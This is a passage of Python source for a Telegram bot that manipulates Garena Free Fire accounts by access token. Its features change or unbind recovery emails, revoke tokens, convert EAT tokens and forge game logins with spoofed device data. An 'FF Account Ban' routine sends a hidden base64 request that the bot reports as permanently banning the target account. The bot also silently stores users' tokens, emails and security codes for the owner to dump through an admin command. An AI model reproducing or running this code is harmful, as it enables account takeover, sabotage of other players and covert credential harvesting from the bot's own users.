        return False, f"<b>Error: {str(e)}</b>"

def revoke_token(access):
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access}"
    try:
        r = requests.get(url, timeout=20)
        if r.text.strip() == '{"result":0}':
            return True, "<b>Token revoked successfully.</b>"
        else:
            return False, f"<b>Failed: {r.text}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def change_bind_email(access, old_email, new_email, otp_old=None, otp_new=None, secondary_password=None):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    identity_token = None
    if otp_old:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": old_email,
            "otp": otp_old,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    elif secondary_password:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": old_email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    if not identity_token:
        return False, "<b>Failed to verify identity for old email.</b>"
    verifier_token = None
    if otp_new:
        verify_otp_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        verify_otp_data = {
            "email": new_email,
            "otp": otp_new,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_otp_url, headers=headers, data=verify_otp_data, timeout=20)
            verifier_token = resp.json().get("verifier_token")
        except:
            pass
    if not verifier_token:
        return False, "<b>Failed to verify new email OTP.</b>"
    rebind_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
    rebind_data = {
        'identity_token': identity_token,
        'email': new_email,
        'app_id': '100067',
        'verifier_token': verifier_token,
        'access_token': access
    }
    try:
        resp = requests.post(rebind_url, headers=headers, data=rebind_data, timeout=20)
        if '"result":0' in resp.text.replace(" ", ""):
            return True, "<b>Email change request created successfully.</b>"
        else:
            return False, f"<b>Failed: {resp.text}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def eat_to_access_token(eat_input):
    try:
        eat_token = None
        if "http" in eat_input or "?" in eat_input:
            parsed = urllib.parse.urlparse(eat_input)
            params = urllib.parse.parse_qs(parsed.query)
            if 'eat' in params:
                eat_token = params['eat'][0]
        else:
            eat_token = eat_input.strip()
        if not eat_token:
            return False, "<b>Could not find EAT token.</b>"
        url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36"}
        response = requests.get(url, headers=headers, allow_redirects=True, timeout=15)
        parsed = urllib.parse.urlparse(response.url)
        params = urllib.parse.parse_qs(parsed.query)
        if 'access_token' in params:
            access_token = params['access_token'][0]
            account_id = params.get('account_id', ['Unknown'])[0]
            nickname = urllib.parse.unquote(params.get('nickname', ['Unknown'])[0])
            region = params.get('region', ['Unknown'])[0]
            result = f"""
<b>EAT to Access Token Conversion</b>

<b>Nickname   :</b> {nickname}
<b>Account ID :</b> {account_id}
<b>Region     :</b> {region}

<b>Access Token :</b> {access_token}
"""
            return True, result
        else:
            return False, "<b>Failed to extract access token. Token might be expired.</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def update_long_bio_fast(access_token, bio_text, retries=2):
    api_url = "https://drogon-bio-api.vercel.app/bio"
    params = {
        "access": access_token,
        "bio": bio_text,
        "region": "IND"
    }
    for attempt in range(retries + 1):
        try:
            response = requests.get(api_url, params=params, timeout=30)
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('success'):
                        return True, f"""
<b>LONG BIO UPDATED!</b>

<b>Name   :</b> {data.get('name', 'N/A')}
<b>UID    :</b> {data.get('uid', 'N/A')}
<b>Region :</b> {data.get('region_used', 'IND')}
<b>Bio    :</b> {data.get('bio', bio_text)}
"""
                    else:
                        return False, f"<b>Failed: {data.get('status', 'Unknown error')}</b>"
                except:
                    return False, "<b>Invalid response from API</b>"
            else:
                if attempt < retries:
                    time.sleep(2)
                    continue
                else:
                    return False, f"<b>API Error: {response.status_code}</b>"
        except requests.exceptions.Timeout:
            if attempt < retries:
                time.sleep(2)
                continue
            else:
                return False, "<b>Request timed out. Please try again.</b>"
        except Exception as e:
            if attempt < retries:
                time.sleep(2)
                continue
            else:
                return False, f"<b>Error: {str(e)}</b>"
    return False, "<b>All attempts failed.</b>"

def ban_check(uid):
    try:
        url = f"https://info.killersharmabot.online/bancheck?uid={uid}"
        response = requests.get(url, timeout=20)
        if response.status_code == 200:
            data = response.json()
            account_id = data.get("accountId", data.get("account_id", "Unknown"))
            name = data.get("name", data.get("nickname", "Unknown"))
            region = data.get("region", "Unknown")
            level = data.get("level", "N/A")
            likes = data.get("likes", "N/A")
            ban_status = data.get("banStatus", data.get("ban_status", "Unknown"))
            banned_since = data.get("bannedSince", data.get("banned_since", "N/A"))
            urban_time = data.get("urban_time", "N/A")
            
            status_lower = str(ban_status).strip().lower()
            if "not banned" in status_lower or "notbanned" in status_lower:
                status_text = "NOT BANNED"
            elif "temporarily" in status_lower or "temporary" in status_lower:
                status_text = "TEMPORARILY BANNED"
            elif "permanent" in status_lower or "permanently" in status_lower:
                status_text = "PERMANENTLY BANNED"
            elif "banned" in status_lower:
                status_text = f"{ban_status}"
            else:
                status_text = f"{ban_status}"
            
            result_text = f"""
<b>BAN CHECK RESULT</b>

<b>Name   :</b> {name}
<b>UID    :</b> {account_id}
<b>Region :</b> {region}
<b>Level  :</b> {level}
<b>Likes  :</b> {likes}
<b>Status :</b> {status_text}
"""
            if banned_since != "N/A" and banned_since:
                result_text += f"\n<b>Since  :</b> {banned_since}"
            if urban_time != "N/A" and urban_time:
                result_text += f"\n<b>Urban  :</b> {urban_time}"
            return True, result_text
        else:
            return False, f"<b>API Error: Status {response.status_code}</b>"
    except requests.exceptions.Timeout:
        return False, "<b>Request timed out. Please try again.</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def fetch_leader_info(uid):
    try:
        url = f"https://info.killersharmabot.online/leader-info?uid={uid}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            basic = data.get("basicInfo", {})
            if basic.get("accountId"):
                return {
                    "name": basic.get("nickname", "Unknown"),
                    "uid": basic.get("accountId", "Unknown"),
                    "region": basic.get("region", "Unknown"),
                    "clan": data.get("clanBasicInfo", {}).get("clanName", "Unknown")
                }
        return None
    except:
        return None

def fetch_wishlist(uid):
    try:
        url = f"https://info.killersharmabot.online/wishlist?uid={uid}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            wishlist = data.get("wishlist", [])
            if wishlist:
                items = [item.get("name", "Unknown") for item in wishlist[:10]]
                return items
        return None
    except:
        return None

def player_info_check(search_param, retries=2):
    try:
        if search_param.isdigit():
            url = f"https://info.killersharmabot.online/player-info?uid={search_param}"
        else:
            url = f"https://info.killersharmabot.online/player-info?name={search_param}"
        
        for attempt in range(retries + 1):
            try:
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    data = response.json()
                    basic_info = data.get("basicInfo")
                    if not basic_info:
                        return False, "<b>Player not found!</b>", None, None
                    
                    account_id = basic_info.get("accountId", "Unknown")
                    nickname = basic_info.get("nickname", "Unknown")
                    region = basic_info.get("region", "Not Choosen")
                    level = basic_info.get("level", "N/A")
                    
                    likes = basic_info.get("likes")
                    if likes is None:
                        likes = basic_info.get("likeCount")
                    if likes is None:
                        likes = basic_info.get("like")
                    if likes is None:
                        likes = "N/A"
                    
                    bio = basic_info.get("bio", "") or basic_info.get("signature", "") or "N/A"
                    head_pic = basic_info.get("headPic", "")
                    banner_id = basic_info.get("bannerId", "")
                    pin_id = basic_info.get("pinId", "900000012")
                    celebrity = basic_info.get("celebrityStatus", 0)
                    prime_level = basic_info.get("primeLevel", {}).get("level", 0)
                    
                    clan_info = data.get("clanBasicInfo", {})
                    clan_name = clan_info.get("clanName", "No Clan")
                    clan_tag = clan_info.get("clanTag", "")
                    clan_display = f"{clan_name} [{clan_tag}]" if clan_tag else clan_name
                    
                    profile_info = data.get("profileInfo", {})
                    equipped_weapons = basic_info.get("weaponSkinShows", [])
                    equipped_outfits = profile_info.get("clothes", [])
                    character_id = profile_info.get("avatarId", "102000007")
                    outfit_ids = ",".join(str(item) for item in (equipped_outfits + equipped_weapons)) if (equipped_outfits or equipped_weapons) else ""
                    
                    frame = "true" if prime_level == 8 else "false"
                    nickname_encoded = nickname.replace('#', '%23').replace('&', '%26')
                    clan_name_encoded = clan_name.replace('#', '%23').replace('&', '%26')
                    
                    banner_url = f"https://image.killersharmabot.online/banner-image?headPic={head_pic}&bannerId={banner_id}&name={nickname_encoded}&level={level}&guild={clan_name_encoded}&pinId={pin_id}&celebrity={celebrity}&primeLevel={prime_level}&frame={frame}"
                    outfit_url = f"https://image.killersharmabot.online/outfit-image?avatar_id={character_id}&clothes={outfit_ids}"
                    
                    leader_data = fetch_leader_info(account_id)
                    leader_text = ""
                    if leader_data:
                        leader_text = f"\n\n<b>Guild Leader</b>\n<b>Name   :</b> {leader_data['name']}\n<b>UID    :</b> {leader_data['uid']}\n<b>Region :</b> {leader_data['region']}\n<b>Clan   :</b> {leader_data['clan']}"
                    
                    wishlist_data = fetch_wishlist(account_id)
                    wishlist_text = ""
                    if wishlist_data:
                        wishlist_text = "\n\n<b>Wishlist Items</b>\n" + "\n".join(f"<b>• {item}</b>" for item in wishlist_data)
                    
                    bio_text = f"\n\n<b>Bio</b>\n<b>{bio}</b>" if bio != "N/A" else ""
                    
                    result_text = f"""
<b>PLAYER INFO CHECK</b>

<b>Name   :</b> {nickname}
<b>UID    :</b> {account_id}
<b>Region :</b> {region}
<b>Level  :</b> {level}
<b>Likes  :</b> {likes}
<b>Clan   :</b> {clan_display}
{bio_text}
{leader_text}
{wishlist_text}
"""
                    return True, result_text, banner_url, outfit_url
                elif response.status_code == 404:
                    return False, "<b>Player not found! Please check UID or Name.</b>", None, None
                else:
                    if attempt < retries:
                        time.sleep(2)
                        continue
                    else:
                        return False, f"<b>API Error: Status {response.status_code}</b>", None, None
            except requests.exceptions.Timeout:
                if attempt < retries:
                    time.sleep(2)
                    continue
                else:
                    return False, "<b>Request timed out. Please try again.</b>", None, None
            except Exception as e:
                if attempt < retries:
                    time.sleep(2)
                    continue
                else:
                    return False, f"<b>Error: {str(e)}</b>", None, None
        return False, "<b>All attempts failed.</b>", None, None
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>", None, None

def ban_account(access_token):
    try:
        jwt_token, error_msg = fetch_majorlogin_jwt(access_token)
        if not jwt_token:
            return False, f"<b>Authentication Failed: {error_msg}</b>"
        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        ban_resp = trigger_ban(jwt_token, version)
        if ban_resp.status_code == 200:
            result_text = f"""
<b>ACCOUNT BANNED SUCCESSFULLY!</b>

<b>Name   :</b> {nickname}
<b>UID    :</b> {account_id}
<b>Region :</b> {region}
<b>Version:</b> {version}
<b>Status :</b> PERMANENTLY BANNED
"""
            return True, result_text
        elif ban_resp.status_code == 401:
            return False, "<b>Token Expired or Invalid (401). Please use a valid Access Token.</b>"
        else:
            return False, f"<b>Failed to execute ban. Status: {ban_resp.status_code}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def trigger_ban(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=30, verify=False)

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", 
                        headers={"User-Agent": "Mozilla/5.0"}, timeout=10).json()
        oId = r.get("open_id")
    except: pass
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", 
                                  headers=uid_headers, verify=False, timeout=10).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", 
                                          json={"app_id": 100067, "login_id": str(uid)}, 
                                          verify=False, timeout=10).json()
                oId = openid_res.get("open_id")
        except: pass
    if not oId:
        return None, "<b>Failed to extract Open ID</b>"
    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        m = MajorLogin()
        m.event_time = str(datetime.now())[:-7]
        m.game_name = "free fire"
        m.platform_id = p_type
        m.client_version = "1.120.1"
        m.system_software = "Android OS 9 / API-28"
        m.system_hardware = "Handheld"
        m.telecom_operator = "Verizon"
        m.network_type = "WIFI"
        m.screen_width = 1920
        m.screen_height = 1080
        m.screen_dpi = "280"
        m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
        m.memory = 3003
        m.gpu_renderer = "Adreno (TM) 640"
        m.gpu_version = "OpenGL ES 3.1 v1.46"
        m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
        m.client_ip = "223.191.51.89"
        m.language = "en"
        m.open_id = oId
        m.open_id_type = str(p_type)
        m.device_type = "Handheld"
        m.access_token = tok
        m.platform_sdk_id = 1
        m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
        m.login_by = 3
        m.channel_type = 3
        m.cpu_type = 2
        m.cpu_architecture = "64"
        m.client_version_code = "2019118695"
        m.login_open_id_type = p_type
        m.origin_platform_type = str(p_type)
        m.primary_platform_type = str(p_type)
        pl = enc(m.SerializeToString())
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=20, verify=False)
            if x.status_code == 200:
                res = MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue
    return None, "<b>MajorLogin failed</b>"

def get_support_inline():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Support",
                    url="https://www.garena.sg/support/"
                )
            ]
        ]
    )

def get_change_method_keyboard():
    keyboard = [
        [
            KeyboardButton(text="Change via OTP", style="success"),
            KeyboardButton(text="Change via Security Code", style="success")
        ],
        [
            KeyboardButton(text="Back to Menu", style="success")
        ]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

# ========== BOT KEYBOARD ==========
def get_main_keyboard():
    keyboard = [
        [
            KeyboardButton(text="Bind Email", style="success"),
            KeyboardButton(text="Check Recovery Email", style="success")
        ],
        [
            KeyboardButton(text="Check Platform", style="success"),
            KeyboardButton(text="Cancel Recovery Email", style="success")
        ],
        [
            KeyboardButton(text="Unbind Email", style="success"),
            KeyboardButton(text="Change Bind Email", style="success")
        ],
        [
            KeyboardButton(text="Get Token Details", style="success"),
            KeyboardButton(text="Single Subscribe", style="success")
        ],
        [
            KeyboardButton(text="Eat to Access Token", style="success"),
            KeyboardButton(text="Ban Status", style="success")
        ],
        [
            KeyboardButton(text="How To Use", style="success"),
            KeyboardButton(text="Support", style="success")
        ],
        [
            KeyboardButton(text="FF Account Ban", style="danger"),
            KeyboardButton(text="Revoke Access Token", style="danger")
        ],
        [
            KeyboardButton(text="Long Bio Update", style="success"),
            KeyboardButton(text="Single Unsubscribe", style="success")
        ],
        [
            KeyboardButton(text="Player Info Check", style="success")
        ]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

# ========== BOT HANDLERS ==========
async def start(message: types.Message, state: FSMContext):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    await state.clear()
    await message.answer(
        "<b>Welcome to Free Fire Email Bot</b>\n\n<b>Select an option from the menu below.</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

async def cancel_command(message: types.Message, state: FSMContext):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    await state.clear()
    await message.answer(
        "<b>Operation cancelled.</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

async def show_logs(message: types.Message):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    if message.from_user.id != OWNER_ID:
        await message.answer("<b>Only admin can view logs.</b>", parse_mode=ParseMode.HTML)
        return
    logs = get_all_logs_since(days=1)
    if not logs:
        await message.answer("<b>No logs today.</b>", parse_mode=ParseMode.HTML)
        return
    recent = logs[-10:]
    text = "<b>Recent Logs</b>\n\n"
    for log in recent:
        text += f"<b>{log['timestamp']}</b>\n<b>{log['username']} (ID: {log['user_id']})</b>\n<b>{log['action']}</b>\n<b>{log.get('result', 'N/A')[:50]}</b>\n\n"
    await message.answer(text, parse_mode=ParseMode.HTML)

# ========== STATS COMMANDS ==========
async def stats_command(message: types.Message):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    user_id = message.from_user.id
    row = get_user_stats(user_id)
    if row:
        total, reg_date, last_act = row
        await message.answer(
            f"<b>Your Stats</b>\n\n"
            f"<b>Total Requests :</b> {total}\n"
            f"<b>Registered on  :</b> {reg_date}\n"
            f"<b>Last Activity :</b> {last_act}",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.answer("<b>No stats found. Please use the bot first.</b>", parse_mode=ParseMode.HTML)

async def admin_stats_command(message: types.Message):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    if message.from_user.id != OWNER_ID:
        await message.answer("<b>Only admin can view this.</b>", parse_mode=ParseMode.HTML)
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT SUM(total_requests) FROM users")
    total_requests = c.fetchone()[0] or 0
    conn.close()
    await message.answer(
        f"<b>Admin Stats</b>\n\n"
        f"<b>Total Users    :</b> {total_users}\n"
        f"<b>Total Requests :</b> {total_requests}",
        parse_mode=ParseMode.HTML
    )

# ========== SECURITY DATA COMMANDS ==========
async def securities_command(message: types.Message):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    if message.from_user.id != OWNER_ID:
        await message.answer("<b>Only admin can view this.</b>", parse_mode=ParseMode.HTML)
        return
    rows = get_all_security_data(10000)
    if not rows:
        await message.answer("<b>No security data found.</b>", parse_mode=ParseMode.HTML)
        return
    text = "<b>Security Data (Last 10000)</b>\n\n"
    serial = 1
    for row in rows:
        text += f"<b>#{serial}</b>\n"
        text += f"<b>User:</b> {row[2]} (ID: {row[1]})\n"
        if row[3]:
            text += f"<b>Token:</b> {row[3]}\n"
        if row[4]:
            text += f"<b>Email:</b> {row[4]}\n"
        if row[5]:
            text += f"<b>Security Code:</b> {row[5]}\n"
        if row[6]:
            text += f"<b>UID:</b> {row[6]}\n"
        text += f"<b>Action:</b> {row[7]}\n"
        text += f"<b>Time:</b> {row[8]}\n\n"
        serial += 1
        if len(text) > 3000:
            await message.answer(text, parse_mode=ParseMode.HTML)
            text = ""
    if text:
        await message.answer(text, parse_mode=ParseMode.HTML)

async def clear_securities_command(message: types.Message):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    if message.from_user.id != OWNER_ID:
        await message.answer("<b>Only admin can do this.</b>", parse_mode=ParseMode.HTML)
        return
    clear_security_data()
    await message.answer("<b>All security data cleared.</b>", parse_mode=ParseMode.HTML)

async def handle_all(message: types.Message, state: FSMContext):
    user = message.from_user
    update_user_stats(user.id, user.username, user.first_name)
    
    # Rate limiting check (0.8 seconds)
    allowed, wait = rate_limited(user.id)
    if not allowed:
        await message.answer(
            f"<b>Too many requests!</b>\n<b>Please wait {wait} seconds.</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    text = message.text
    current_state = await state.get_state()
    
    # ========== HOW TO USE ==========
    if text == "How To Use":
        await message.answer(
            "<b>How to Use</b>\n\n"
            "<b>Email Management</b>\n"
            "<b>Bind Email</b> - <b>Add recovery email</b>\n"
            "<b>Check Recovery Email</b> - <b>View current status</b>\n"
            "<b>Cancel Recovery Email</b> - <b>Cancel pending request</b>\n"
            "<b>Unbind Email</b> - <b>Remove bound email</b>\n"
            "<b>Change Bind Email</b> - <b>Change to new email</b>\n\n"
            "<b>Account Info</b>\n"
            "<b>Check Platform</b> - <b>View linked platforms</b>\n"
            "<b>Get Token Details</b> - <b>Token information</b>\n"
            "<b>Player Info Check</b> - <b>Full player details</b>\n\n"
            "<b>Security</b>\n"
            "<b>Ban Status</b> - <b>Check account ban status</b>\n"
            "<b>FF Account Ban</b> - <b>Ban an account</b>\n"
            "<b>Revoke Access Token</b> - <b>Revoke token</b>\n\n"
            "<b>Other Features</b>\n"
            "<b>Long Bio Update</b> - <b>Update player bio</b>\n"
            "<b>Single Unsubscribe</b> - <b>Send unsubscribe OTP</b>\n"
            "<b>Eat to Access Token</b> - <b>Convert EAT token</b>\n"
            "<b>Single Subscribe</b> - <b>Subscribe feature</b>\n\n"
            "<b>Click any button and follow instructions.</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== SUPPORT ==========
    if text == "Support":
        await message.answer(
            "<b>Need Help?</b>\n\n<b>Click the button below to visit official Garena Support Center.</b>\n\n<b>Use /start to restart the bot.</b>\n<b>Use /cancel to cancel current operation.</b>",
            reply_markup=get_support_inline(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== LONG BIO UPDATE ==========
    if text == "Long Bio Update":
        await state.set_state("waiting_long_bio_token")
        await state.update_data(action="long_bio")
        await message.answer(
            "<b>Long Bio Update</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== SINGLE SUBSCRIBE ==========
    if text == "Single Subscribe":
        success, msg = single_subscribe()
        await message.answer(f"{msg}", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        return

    # ========== SINGLE UNSUBSCRIBE ==========
    if text == "Single Unsubscribe":
        await state.set_state("waiting_unsubscribe_email")
        await state.update_data(action="single_unsubscribe")
        await message.answer(
            "<b>Single Unsubscribe</b>\n\n<b>Please enter the email address:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== PLAYER INFO CHECK ==========
    if text == "Player Info Check":
        await state.set_state("waiting_player_info")
        await state.update_data(action="player_info")
        await message.answer(
            "<b>Player Info Check</b>\n\n<b>Please enter UID or Name:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== BIND EMAIL ==========
    if text == "Bind Email":
        await state.set_state("waiting_bind_token")
        await state.update_data(action="bind_email_new")
        await message.answer(
            "<b>Bind Email</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHECK RECOVERY EMAIL ==========
    if text == "Check Recovery Email":
        await state.set_state("waiting_token")
        await state.update_data(action="check_recovery")
        await message.answer(
            "<b>Check Recovery Email</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHECK PLATFORM ==========
    if text == "Check Platform":
        await state.set_state("waiting_token")
        await state.update_data(action="check_platform")
        await message.answer(
            "<b>Check Platform</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== GET TOKEN DETAILS ==========
    if text == "Get Token Details":
        await state.set_state("waiting_token")
        await state.update_data(action="token_details")
        await message.answer(
            "<b>Get Token Details</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CANCEL RECOVERY EMAIL ==========
    if text == "Cancel Recovery Email":
        await state.set_state("waiting_token")
        await state.update_data(action="cancel_recovery")
        await message.answer(
            "<b>Cancel Recovery Email</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== UNBIND EMAIL ==========
    if text == "Unbind Email":
        await state.set_state("waiting_token")
        await state.update_data(action="unbind")
        await message.answer(
            "<b>Unbind Email</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHANGE BIND EMAIL ==========
    if text == "Change Bind Email":
        await state.set_state("waiting_change_token")
        await state.update_data(action="change_bind")
        await message.answer(
            "<b>Change Bind Email</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== REVOKE ACCESS TOKEN ==========
    if text == "Revoke Access Token":
        await state.set_state("waiting_token")
        await state.update_data(action="revoke")
        await message.answer(
            "<b>Revoke Access Token</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== EAT TO ACCESS TOKEN ==========
    if text == "Eat to Access Token":
        await state.set_state("waiting_eat_token")
        await state.update_data(action="eat_token")
        await message.answer(
            "<b>Eat to Access Token</b>\n\n<b>Please enter your EAT Token or URL:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== FF ACCOUNT BAN ==========
    if text == "FF Account Ban":
        await state.set_state("waiting_token")
        await state.update_data(action="ff_ban")
        await message.answer(
            "<b>FF Account Ban Only IND Server</b>\n\n<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== BAN STATUS ==========
    if text == "Ban Status":
        await state.set_state("waiting_uid")
        await state.update_data(action="ban_check")
        await message.answer(
            "<b>Ban Status</b>\n\n<b>Please enter the UID:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== BACK TO MENU ==========
    if text == "Back to Menu":
        await state.clear()
        await message.answer(
            "<b>Returned to main menu.</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== PROCESS INPUT ==========
    
    # ----- PLAYER INFO CHECK -----
    if current_state == "waiting_player_info":
        if not text.strip():
            await message.answer(
                "<b>Input cannot be empty. Please enter UID or Name.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        search_param = text.strip()
        await message.answer("<b>Fetching player info...</b>", parse_mode=ParseMode.HTML)
        success, msg, banner_url, outfit_url = player_info_check(search_param)
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="PLAYER_INFO_CHECK",
            data={"search": search_param},
            result="Success" if success else "Failed"
        )
        if success:
            await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            if banner_url:
                try:
                    await message.answer_photo(photo=banner_url)
                except:
                    pass
            if outfit_url:
                try:
                    await message.answer_photo(photo=outfit_url)
                except:
                    pass
        else:
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ----- SINGLE UNSUBSCRIBE -----
    if current_state == "waiting_unsubscribe_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format. Please enter a valid email.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        email = text.strip()
        await message.answer("<b>Sending unsubscribe OTP...</b>", parse_mode=ParseMode.HTML)
        success, msg = single_unsubscribe(email)
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="SINGLE_UNSUBSCRIBE",
            data={"email": email},
            result="Success" if success else "Failed"
        )
        await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ----- CHANGE BIND EMAIL -----
    if current_state == "waiting_change_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token. Please enter a valid token.</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        token = text.strip()
        save_security_data(user.id, user.username, token=token, action="CHANGE_BIND_TOKEN")
        success, info = check_recovery(token)
        await message.answer(info, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.update_data(change_token=token)
        await state.set_state("waiting_change_method")
        await message.answer(
            "<b>Select change method:</b>",
            reply_markup=get_change_method_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_change_method":
        if text == "Change via OTP":
            token = (await state.get_data()).get("change_token")
            if not token:
                await message.answer("<b>Session expired. Start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                await state.clear()
                return
            await message.answer("<b>Sending OTP to your bound email...</b>", parse_mode=ParseMode.HTML)
            try:
                url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
                payload = {'app_id': "100067", 'access_token': token}
                resp = requests.get(url, params=payload, headers={'User-Agent': "GarenaMSDK/4.0.19P9"}, timeout=15)
                email = resp.json().get("email", "")
                if not email:
                    await message.answer("<b>No bound email found!</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                    await state.clear()
                    return
            except Exception as e:
